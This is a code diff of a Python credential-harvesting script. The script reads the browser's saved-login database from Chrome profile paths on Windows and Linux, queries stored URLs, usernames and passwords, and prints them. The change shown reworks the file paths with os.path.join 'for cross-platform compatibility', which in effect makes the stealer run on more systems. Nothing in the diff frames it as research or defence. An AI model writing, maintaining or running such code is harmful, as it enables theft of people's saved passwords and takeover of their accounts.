@@ -1,6 +1,9 @@
 import os
 import subprocess
 
+# Use os.path.join for cross-platform compatibility
+login_data_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
+
 def harvest_credentials():
     credentials = []
 
@@ -21,7 +24,7 @@ def harvest_credentials():
             from sqlite3 import connect
 
             # Path to Chrome's login data
-            login_data_path = os.path.expanduser("~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
+            login_data_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
             conn = connect(login_data_path)
             cursor = conn.cursor()
             cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
@@ -56,7 +59,7 @@ def harvest_credentials():
             import json
 
             # Path to Chrome's login data
-            login_data_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
+            login_data_path = os.path.join(os.path.expanduser("~"), ".config", "google-chrome", "Default", "Login Data")
             conn = connect(login_data_path)
             cursor = conn.cursor()
             cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
@@ -79,3 +82,4 @@ if __name__ == "__main__":
     creds = harvest_credentials()
     for cred in creds:
         print(cred)
+
